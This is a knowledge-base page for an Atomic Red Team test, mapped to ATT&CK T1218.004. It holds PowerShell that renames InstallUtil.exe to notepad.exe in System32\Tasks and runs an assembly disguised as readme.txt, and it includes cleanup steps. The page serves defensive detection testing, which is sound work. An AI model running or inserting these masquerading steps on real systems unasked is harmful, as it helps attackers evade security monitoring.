---
atomic_guid: "559e6d06-bb42-4307-bff7-3b95a8254bad"
title: "InstallUtil evasive invocation"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.004"
attack_technique_name: "Signed Binary Proxy Execution: InstallUtil"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "559e6d06-bb42-4307-bff7-3b95a8254bad"
  - "InstallUtil evasive invocation"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# InstallUtil evasive invocation

Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, "Running a transacted installation."
will be displayed, along with other information about the opperation. "The transacted install has completed." will be displayed upon completion.

## Metadata

- Atomic GUID: 559e6d06-bb42-4307-bff7-3b95a8254bad
- Technique: T1218.004: Signed Binary Proxy Execution: InstallUtil
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1218.004/T1218.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.004]]

## Input Arguments

### test_harness

- description: location of the test harness script - Invoke-BuildAndInvokeInstallUtilAssembly
- type: path
- default: PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1

## Dependencies

InstallUtil test harness script must be installed at specified location (#{test_harness})

### Prerequisite Check

```untitled
if (Test-Path "#{test_harness}") {exit 0} else {exit 1}
```

### Get Prerequisite

```untitled
New-Item -Type Directory (split-path "#{test_harness}") -ErrorAction ignore | Out-Null
Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile "#{test_harness}"
```

## Executor

- name: powershell

### Command

```powershell
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. "#{test_harness}"

$InstallerAssemblyDir = "$Env:windir\System32\Tasks"
$InstallerAssemblyFileName = 'readme.txt'
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = "readme.txt"
$ExpectedOutput = 'Constructor_'

# Explicitly set the directory so that a relative path to readme.txt can be supplied.
Set-Location "$Env:windir\System32\Tasks"

Copy-Item -Path "$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" -Destination "$Env:windir\System32\Tasks\notepad.exe"

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
    InstallUtilPath = "$Env:windir\System32\Tasks\notepad.exe"
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @"
Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
"@
}
```

### Cleanup

```powershell
Remove-Item -Path "$Env:windir\System32\Tasks\readme.txt" -ErrorAction Ignore
Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallLog" -ErrorAction Ignore
Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallState" -ErrorAction Ignore
Remove-Item -Path "$Env:windir\System32\Tasks\notepad.exe" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.yaml)
